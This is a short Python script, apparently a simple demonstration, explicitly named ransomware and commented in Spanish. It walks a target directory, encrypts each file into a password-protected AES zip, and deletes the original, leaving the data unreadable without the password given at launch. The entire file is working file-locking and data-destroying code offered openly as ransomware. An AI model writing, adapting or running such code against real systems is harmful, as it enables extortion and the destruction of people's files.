import os
import sys
import pyzipper

def ransomware(directory, password):
    try:
        # Comprimir cada archivo individual en la carpeta con contraseña
        for root, _, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, directory)  # Obtener la ruta relativa del archivo
                zip_path = file_path + ".zip"
                with pyzipper.AESZipFile(zip_path, 'w', compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zipf:
                    zipf.setpassword(password.encode())
                    zipf.write(file_path, arcname=arcname)

                os.remove(file_path)
                print(f"Archivo {file} comprimido y original eliminado.")

        print("Tus archivos han sido comprimidos y los originales eliminados correctamente.")
    except Exception as e:
        print(f"Error al ejecutar el ransomware en {directory}: {str(e)}")

def main():
    if len(sys.argv) != 3:
        print("Uso: python ransomware.py <directorio> <contraseña>")
        sys.exit(1)
    
    directory = sys.argv[1]
    password = sys.argv[2]
    
    if not os.path.isdir(directory):
        print(f"{directory} no es un directorio válido.")
        sys.exit(1)

    # Ejecutar el ransomware
    ransomware(directory, password)

if __name__ == "__main__":
    main()
